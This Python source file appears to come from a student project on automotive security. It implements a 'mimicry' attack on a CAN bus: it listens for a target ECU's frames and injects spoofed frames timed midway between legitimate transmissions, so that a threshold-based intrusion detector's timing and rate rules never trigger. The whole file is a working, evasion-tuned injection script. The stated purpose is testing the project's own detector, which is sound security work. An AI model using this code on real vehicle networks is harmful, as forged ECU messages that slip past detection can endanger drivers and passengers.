# Author: Rayan Hamour (22103817)
"""
Mimicry (evasive) attack against the rule-based IDS: rather than flooding
or injecting at random moments, this attacker taps the bus (CAN is
broadcast, so any attached node can passively listen), observes the
legitimate ECU's actual transmission times for the target ID, and places
each injected frame precisely midway between two observed legitimate
transmissions. That maximises the inter-arrival gap on both sides of the
injection, so the timing-deviation rule - which only fires on gaps
*shorter* than nominal-period/ratio - never triggers. Injecting less than
once per legitimate cycle (`cycles_between_injections` > 1) also keeps the
added traffic under the rate-threshold rule.

This models a patient, bus-aware attacker rather than a naive flood, and
is a real, literature-documented technique for evading threshold-based CAN
IDS (mimicry/masquerade attacks). It is a genuine test of whether the
project's rule-based detector holds up against a deliberately careful
adversary, not just a loud one.
"""

from __future__ import annotations

import threading
import time

import can

from carnet.can.bus import create_bus


class _MimicryListener(can.Listener):
    def __init__(self, target_id: int, half_period_s: float, cycles_between_injections: int, inject_fn):
        self.target_id = target_id
        self.half_period_s = half_period_s
        self.cycles_between_injections = max(1, cycles_between_injections)
        self.inject_fn = inject_fn
        self.seen_count = 0

    def on_message_received(self, msg: can.Message) -> None:
        if msg.arbitration_id != self.target_id:
            return
        self.seen_count += 1
        if self.seen_count % self.cycles_between_injections == 0:
            timer = threading.Timer(self.half_period_s, self.inject_fn)
            timer.daemon = True
            timer.start()


def run_mimicry_attack(
    bus: can.Bus,
    target_id: int,
    nominal_period_s: float,
    duration_s: float,
    cycles_between_injections: int,
    spoofed_payload: bytes,
) -> dict:
    data = spoofed_payload[:8].ljust(8, b"\x00")
    injected_count = [0]

    def _inject() -> None:
        msg = can.Message(arbitration_id=target_id, data=data, is_extended_id=False)
        try:
            bus.send(msg)
            injected_count[0] += 1
        except can.CanError:
            pass

    tap_bus = create_bus()
    listener = _MimicryListener(target_id, nominal_period_s / 2, cycles_between_injections, _inject)
    notifier = can.Notifier(tap_bus, [listener])
    try:
        time.sleep(duration_s)
    finally:
        notifier.stop()
        tap_bus.shutdown()

    return {"legit_observed": listener.seen_count, "injected": injected_count[0]}
